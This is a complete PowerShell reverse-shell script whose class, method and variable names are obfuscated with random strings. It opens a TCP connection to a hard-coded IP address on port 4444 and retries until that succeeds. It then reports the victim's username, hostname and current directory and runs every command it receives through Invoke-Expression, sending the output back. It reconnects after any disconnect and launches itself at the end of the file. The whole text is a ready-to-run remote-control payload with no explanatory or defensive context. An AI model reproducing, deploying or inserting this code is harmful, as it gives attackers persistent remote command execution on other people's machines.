class gvuasYXrRkZ {
    
    [string]$auUlJsgGKNg = "93.49.240.195"
    [int]$CRPwHtgtUmJlanz = 4444

    $keMwMBBtGwnZb
    $GquGaWlvXmZHC
    $yPDszaHnlWfoHnIvDGnGyV
    $VsrgnuzqkaIMpObNzImoreNv
    $fHkIwkHfotGAEyDuKyp
    $ZQlFfK
    [int]$XySuXizfRSagdWfCnhWsLe = 50*1024

    UpcThy() {
        $this.GquGaWlvXmZHC = $false
        while ($true) {
            try {
                $this.GquGaWlvXmZHC = New-Object Net.Sockets.TcpClient($this.auUlJsgGKNg, $this.CRPwHtgtUmJlanz)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.kBoBMxaleuZvFkI()
    }

    kBoBMxaleuZvFkI() {
        $this.keMwMBBtGwnZb = $this.GquGaWlvXmZHC.GetStream()
        $this.VsrgnuzqkaIMpObNzImoreNv = New-Object Byte[] $this.XySuXizfRSagdWfCnhWsLe
        $this.ZQlFfK = New-Object Text.UTF8Encoding
        $this.yPDszaHnlWfoHnIvDGnGyV = New-Object IO.StreamWriter($this.keMwMBBtGwnZb, [Text.Encoding]::UTF8, $this.XySuXizfRSagdWfCnhWsLe)
        $this.fHkIwkHfotGAEyDuKyp = New-Object System.IO.StreamReader($this.keMwMBBtGwnZb)
        $this.yPDszaHnlWfoHnIvDGnGyV.AutoFlush = $true
    }

    WWhdNemgGyv() {
        $this.UpcThy()
        $this.mukxArSqlVCx()
    }

    VdsiLMsiANliNBvat($OnDStbyBkpTilvlenhqiEzY) {
        try {
            [byte[]]$DCKeVmclpO = [text.Encoding]::Ascii.GetBytes($OnDStbyBkpTilvlenhqiEzY)
            $this.yPDszaHnlWfoHnIvDGnGyV.Write($DCKeVmclpO, 0, $DCKeVmclpO.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.WWhdNemgGyv()
        }
    }

    [string] nYHtspjpRPDtyYzXlRh() {
        try {
            $RTaWZZuvm = $this.keMwMBBtGwnZb.Read($this.VsrgnuzqkaIMpObNzImoreNv, 0, $this.XySuXizfRSagdWfCnhWsLe)    
            $btMRJGAFdNgCecxCRBg = ($this.ZQlFfK.GetString($this.VsrgnuzqkaIMpObNzImoreNv, 0, $RTaWZZuvm))
            return $btMRJGAFdNgCecxCRBg
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.WWhdNemgGyv()
            return ""
        }
    }

    [string] uTmio($YodlOTSEhBdAjuZWpoQrTzRi) {
        Write-Host $YodlOTSEhBdAjuZWpoQrTzRi
        try { 
            $CCjNobXSIxK = Invoke-Expression $YodlOTSEhBdAjuZWpoQrTzRi | Out-String
        }
        catch {
            $fiZQqXiftBIiyWbyKdaBjyKL = $_.Exception
            $FIynzlJR = $_.Message
            $CCjNobXSIxK = "`n$_`n"
        }
        return $CCjNobXSIxK
    }

    [string] yajHkMjtTSIQog() {
        $fdMdYEGxpPKyOjTjS = [Environment]::UserName
        $UpzjUGOPlFvBeQvNnVQlw = [System.Net.Dns]::GetHostName()
        $gIIeQCEOQEmxLEtsQobb = Get-Location
        return "$fdMdYEGxpPKyOjTjS@$UpzjUGOPlFvBeQvNnVQlw [$gIIeQCEOQEmxLEtsQobb]~$ "
    }

    mukxArSqlVCx() {
        while ($this.GquGaWlvXmZHC.Connected) {
            $this.VdsiLMsiANliNBvat($this.yajHkMjtTSIQog())         
            $btMRJGAFdNgCecxCRBg = $this.nYHtspjpRPDtyYzXlRh()
            $CCjNobXSIxK = "`n"
            if ([string]::IsNullOrEmpty($btMRJGAFdNgCecxCRBg)) {
                continue
            }
            $CCjNobXSIxK = $this.uTmio($btMRJGAFdNgCecxCRBg)
            $this.VdsiLMsiANliNBvat($CCjNobXSIxK + "`n")
            $this.keMwMBBtGwnZb.Flush()
        }
        $this.GquGaWlvXmZHC.Close()
        $this.WWhdNemgGyv()
    } 
}

$MphVaDpimkxIwuEKlzEF = [gvuasYXrRkZ]::new()
$MphVaDpimkxIwuEKlzEF.WWhdNemgGyv()
